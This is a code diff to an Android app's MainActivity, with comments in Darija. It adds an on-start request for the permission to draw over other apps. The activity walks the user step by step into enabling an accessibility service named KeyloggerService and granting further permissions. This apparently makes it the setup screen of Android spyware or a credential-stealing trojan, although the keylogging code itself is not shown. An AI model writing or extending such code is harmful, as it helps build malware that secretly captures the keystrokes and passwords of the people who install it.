@@ -10,6 +10,7 @@ import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.graphics.Typeface;
 import android.graphics.drawable.GradientDrawable;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
@@ -35,6 +36,12 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
+        // JDAD: Tleb Overlay Permission
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, 101);
+        }
+
         // Load Custom Fonts (Poppins)
         try {
             customFont = Typeface.createFromAsset(getAssets(), "Poppins-Regular.ttf");
@@ -156,7 +163,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // Helper bach n-9ado l'boutons b rounded corners
     private GradientDrawable createRoundedButton(int color) {
         GradientDrawable drawable = new GradientDrawable();
         drawable.setShape(GradientDrawable.RECTANGLE);
@@ -176,11 +182,11 @@ public class MainActivity extends Activity {
         isAccEnabled = isAccessibilityServiceEnabled(this, KeyloggerService.class);
         if (isAccEnabled) {
             tvAccStatus.setText("Step 1: Accessibility ✓ Done");
-            tvAccStatus.setTextColor(Color.parseColor("#34D399")); // Green
+            tvAccStatus.setTextColor(Color.parseColor("#34D399"));
             btnAcc.setVisibility(View.GONE);
         } else {
             tvAccStatus.setText("Step 1: Accessibility ❌ Not Enabled");
-            tvAccStatus.setTextColor(Color.parseColor("#F87171")); // Red
+            tvAccStatus.setTextColor(Color.parseColor("#F87171"));
             btnAcc.setVisibility(View.VISIBLE);
         }
 
@@ -196,7 +202,6 @@ public class MainActivity extends Activity {
             btnPerm.setVisibility(View.VISIBLE);
         }
 
-        // Show Continue if both are done
         if (isAccEnabled && isPermsEnabled) {
             btnContinue.setVisibility(View.VISIBLE);
         } else {
@@ -235,7 +240,6 @@ public class MainActivity extends Activity {
         checkStatus();
     }
 
-    // Check wach l'Accessibility m-activi f Settings
     public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
         ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
         String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
@@ -251,4 +255,4 @@ public class MainActivity extends Activity {
         }
         return false;
     }
-            }
+}
